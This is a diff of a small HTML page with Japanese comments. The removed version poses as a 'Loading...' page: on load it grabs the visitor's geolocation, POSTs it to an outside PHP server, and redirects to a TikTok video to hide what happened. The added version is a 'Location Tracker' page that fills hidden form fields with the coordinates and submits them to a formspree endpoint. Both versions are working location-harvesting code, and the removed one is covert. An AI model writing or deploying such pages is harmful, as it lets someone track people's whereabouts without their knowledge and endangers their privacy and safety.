@@ -1,37 +1,30 @@
 <!DOCTYPE html>
-<html lang="ja">
+<html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Loading...</title>
-    <script>
-        function getLocation() {
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(sendLocation, redirectNow);
-            } else {
-                redirectNow();
-            }
-        }
-
-        function sendLocation(position) {
-            let lat = position.coords.latitude;
-            let lon = position.coords.longitude;
-
-            // 無料PHPサーバーのURLに変更
-            fetch("https://daisuki.fwh.is/htdocs/save_location.php", {
-                method: "POST",
-                headers: { "Content-Type": "application/x-www-form-urlencoded" },
-                body: `lat=${lat}&lon=${lon}`
-            }).finally(redirectNow);
-        }
-
-        function redirectNow() {
-            window.location.replace("https://www.tiktok.com/@kaga1024/video/7431843644312800513"); // リダイレクト先のURL
-        }
-
-        getLocation();
-    </script>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Location Tracker</title>
 </head>
 <body>
+
+<h2>Send Location</h2>
+
+<form action="https://formspree.io/f/xvgkbeyk" method="POST">
+  <input type="hidden" id="lat" name="lat">
+  <input type="hidden" id="lon" name="lon">
+  <button type="submit">Send Location</button>
+</form>
+
+<script>
+  // 位置情報取得
+  if (navigator.geolocation) {
+    navigator.geolocation.getCurrentPosition(function(position) {
+      // 位置情報をフォームにセット
+      document.getElementById('lat').value = position.coords.latitude;
+      document.getElementById('lon').value = position.coords.longitude;
+    });
+  }
+</script>
+
 </body>
 </html>
